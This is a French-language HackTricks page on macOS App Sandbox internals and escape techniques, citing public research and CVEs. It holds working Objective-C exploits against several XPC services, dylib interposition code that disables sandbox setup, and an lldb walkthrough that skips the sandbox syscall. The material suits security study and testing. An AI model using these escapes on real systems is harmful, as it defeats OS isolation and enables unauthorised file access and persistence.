# Debug & Bypass du macOS Sandbox

{{#include ../../../../../banners/hacktricks-training.md}}

## Processus de chargement du Sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Image from <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Dans l'image précédente, il est possible d'observer **comment le sandbox est chargé** lorsqu'une application possédant l'entitlement **`com.apple.security.app-sandbox`** est exécutée.

Le compilateur lie `/usr/lib/libSystem.B.dylib` au binaire.

Ensuite, **`libSystem.B`** appelle plusieurs autres fonctions jusqu'à ce que **`xpc_pipe_routine`** envoie les entitlements de l'application à **`securityd`**. Securityd vérifie si le processus doit être placé en quarantaine dans le Sandbox et, si c'est le cas, il le met en quarantaine.\
Enfin, le sandbox est activé par un appel à **`__sandbox_ms`**, qui appellera **`__mac_syscall`**.<sup>[1]</sup>

## Bypasses possibles

### Bypass de l'attribut de quarantaine

**Les fichiers créés par des processus sandboxés** reçoivent l'**attribut de quarantaine** afin d'empêcher les sandbox escapes : si vous déposez une nouvelle application et tentez de la lancer, le flag de quarantaine l'en empêche. Par conséquent, **si vous pouvez déposer un fichier ou un dossier *sans* l'attribut de quarantaine, vous pouvez échapper à l'App Sandbox** — il suffit de déposer un bundle `.app` et de le lancer avec `open`, puisque le processus nouvellement lancé s'exécute sous LaunchServices et non sous votre sandbox.

La méthode fiable pour effectuer un **drop sans quarantaine** consiste à demander à **un autre processus de créer le fichier pour vous**. Comme le documente [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) de Mickey Jin, l'**App Sandbox** marque les fichiers déposés avec la quarantaine, contrairement aux services XPC exécutés sous le Service Sandbox. Plusieurs services XPC non authentifiés pouvaient donc servir de primitive de "quarantine laundering" :<sup>[4]</sup>

- **CVE-2023-27944** (`TrialArchivingService`) et **CVE-2023-32414** (`ArchiveService`) : extraient une archive fournie par une application sandboxée vers un emplacement choisi **sans propager le xattr de quarantaine** au contenu extrait.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`) : le path traversal dans `submitSignpostDataWithConfig:` permettait de créer des répertoires **arbitraires sans quarantaine**, ce qui suffit pour construire toute la structure d'un bundle `.app` en dehors du container.
- **CVE-2024-27864** (`diskimagescontroller.xpc`) : attache une DMG en quarantaine **sans mettre en quarantaine le device résultant**, ce qui permet de lancer les applications présentes sur le volume monté.

> [!TIP]
> L'extraction **supprime généralement le bit de permission d'exécution**. Le workaround utilisé dans CVE-2023-27944 consistait à placer un **symlink** vers un binaire système signé existant (par exemple `/System/Library/CoreServices/Automator Application Stub`) comme exécutable principal du bundle, afin qu'il reste lançable sans nécessiter `+x` sur un fichier déposé.

> [!CAUTION]
> La raison pour laquelle cela fonctionne est que la vérification dépend du **flag présent sur l'élément lancé** : *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, et seulement ensuite *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). L'absence de flag sur le bundle que vous lancez signifie qu'aucun contrôle Gatekeeper n'est effectué — c'est précisément la primitive fournie par les CVE ci-dessus.<sup>[5]</sup>
>
> Notez que si un bundle `.app` a déjà été autorisé à s'exécuter (il possède un xattr de quarantaine avec le flag "authorized to run"), vous pourriez également l'abuser... sauf que vous ne pouvez désormais plus écrire dans les bundles **`.app`** à moins de disposer de permissions TCC privilégiées (ce qui ne sera pas le cas dans un sandbox).

### Abuse de la fonctionnalité Open

Dans les [**derniers exemples de bypass du sandbox Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), on peut voir comment la fonctionnalité cli **`open`** pourrait être utilisée pour bypass le sandbox.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Même si une application est **censée être sandboxée** (`com.apple.security.app-sandbox`), il est possible de bypass le sandbox si elle est **exécutée depuis un LaunchAgent** (`~/Library/LaunchAgents`), par exemple.\
Comme expliqué dans [**ce post**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), si vous voulez obtenir de la persistence avec une application sandboxée, vous pouvez la faire exécuter automatiquement comme LaunchAgent et éventuellement injecter du code malveillant via les variables d'environnement DyLib.<sup>[6]</sup>

### Abuse des emplacements Auto Start

Si un processus sandboxé peut **écrire** à un emplacement où **une application non sandboxée exécutera ultérieurement le binaire**, il pourra **s'échapper simplement en y plaçant** le binaire. `~/Library/LaunchAgents` ou `/System/Library/LaunchDaemons` sont de bons exemples de ce type d'emplacements.

Pour cela, vous pourriez même avoir besoin de **2 étapes** : faire en sorte qu'un processus disposant d'un **sandbox plus permissif** (`file-read*`, `file-write*`) exécute votre code, lequel écrira effectivement à un emplacement où il sera **exécuté sans sandbox**.

Consultez cette page sur les **emplacements Auto Start** :


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abuse d'autres processus

Si, depuis ce processus sandboxé, vous êtes capable de **compromettre d'autres processus** exécutés dans des sandbox moins restrictifs (ou sans sandbox), vous pourrez échapper à leurs sandbox :


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Services Mach System et User disponibles

Le sandbox permet également de communiquer avec certains **services Mach** via XPC, définis dans le profil `application.sb`. Si vous êtes capable d'**abuser** de l'un de ces services, vous pourriez être en mesure de **vous échapper du sandbox**.

Comme indiqué dans [ce writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), les informations sur les services Mach sont stockées dans `/System/Library/xpc/launchd.plist`. Il est possible de trouver tous les services Mach System et User en recherchant `<string>System</string>` et `<string>User</string>` dans ce fichier.<sup>[4]</sup>

De plus, il est possible de vérifier si un service Mach est disponible pour une application sandboxée en appelant `bootstrap_look_up`:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Services Mach PID disponibles

Ces services Mach ont d'abord été exploités pour [s'échapper du sandbox dans ce writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). À cette époque, **tous les XPC services requis** par une application et son framework étaient visibles dans le domaine PID de l'application (il s'agit de Mach Services dont le `ServiceType` est `Application`).<sup>[4]</sup>

Pour **contacter un service XPC du PID Domain**, il suffit de l'enregistrer dans l'application avec une ligne telle que :
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
De plus, il est possible de trouver tous les services Mach **Application** en recherchant `<string>Application</string>` dans `System/Library/xpc/launchd.plist`.

Une autre façon de trouver les services xpc valides consiste à vérifier ceux présents dans :
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Plusieurs exemples exploitant cette technique sont présentés dans le [**writeup original**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), mais voici quelques exemples résumés.<sup>[4]</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Ce service autorise toutes les connexions XPC en renvoyant systématiquement `YES`, et la méthode `runTask:arguments:withReply:` exécute une commande arbitraire avec des paramètres arbitraires.

L'exploit était « aussi simple que » :
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Ce service XPC autorisait tous les clients en retournant systématiquement YES, et la méthode `createZipAtPath:hourThreshold:withReply:` permettait essentiellement d'indiquer le chemin vers un dossier à compresser, puis de le compresser dans un fichier ZIP.

Il est donc possible de générer une fausse structure de dossier d'application, de la compresser, puis de la décompresser et de l'exécuter afin de s'échapper de la sandbox, car les nouveaux fichiers ne posséderont pas l'attribut de quarantaine.

L'exploit était le suivant :
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Ce service XPC permet d'accorder un accès en lecture et en écriture à une URL arbitraire au client XPC via la méthode `extendAccessToURL:completion:`, qui acceptait toute connexion. Comme le service XPC dispose de FDA, il est possible d'abuser de ces permissions pour contourner complètement TCC.

L'exploit était le suivant :
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Compilation statique et linking dynamique

[**Cette recherche**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) a découvert 2 façons de bypass le Sandbox. Comme le sandbox est appliqué depuis le userland lorsque la bibliothèque **libSystem** est chargée. Si un binaire pouvait éviter de la charger, il ne serait jamais sandboxé :<sup>[2]</sup>

- Si le binaire était **entièrement compilé statiquement**, il pourrait éviter de charger cette bibliothèque.
- Si le **binaire n'avait besoin de charger aucune bibliothèque** (car le linker se trouve également dans libSystem), il n'aurait pas besoin de charger libSystem.

### Shellcodes

Notez que même les **shellcodes** sur ARM64 doivent être linkés avec `libSystem.dylib` :
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Restrictions non héritées

Comme expliqué dans le **[bonus de ce writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, une restriction sandbox comme :<sup>[4]</sup>
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
peut être contourné par un nouveau processus qui exécute, par exemple :
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
Cependant, bien sûr, ce nouveau processus n'héritera pas des entitlements ou privilèges du processus parent.

### Entitlements

Notez que même si certaines **actions** peuvent être **autorisées par le sandbox** si une application possède un **entitlement** spécifique, comme dans :
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Bypass par Interposting

Pour plus d'informations sur **Interposting**, consultez :


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interposer `_libsecinit_initializer` pour empêcher le sandbox
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interposer `__mac_syscall` pour empêcher le Sandbox
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Déboguer et contourner Sandbox avec lldb

Compilons une application qui devrait être sandboxée :

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Compilez ensuite l’application :
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> L'application essaiera de **lire** le fichier **`~/Desktop/del.txt`**, ce que le **Sandbox n'autorisera pas**.\
> Créez-y un fichier, car une fois le Sandbox contourné, l'application pourra le lire :
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Déboguons l'application pour voir quand le Sandbox est chargé :
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Même avec le Sandbox contourné, TCC** demandera à l’utilisateur s’il souhaite autoriser le processus à lire les fichiers du bureau

## Références

- [1] [Jonathan Levin - Le Apple Sandbox : plus en profondeur dans le bourbier (slides HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Mac App Store Sandbox Escape](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Le Apple Sandbox : plus en profondeur dans le bourbier (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - Une nouvelle ère des Sandbox Escapes de macOS](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (drops non mis en quarantaine via des services XPC : CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Explication : Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox) : macOS TCC Bypass avec Telegram via DyLib Injection (Partie 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)

{{#include ../../../../../banners/hacktricks-training.md}}
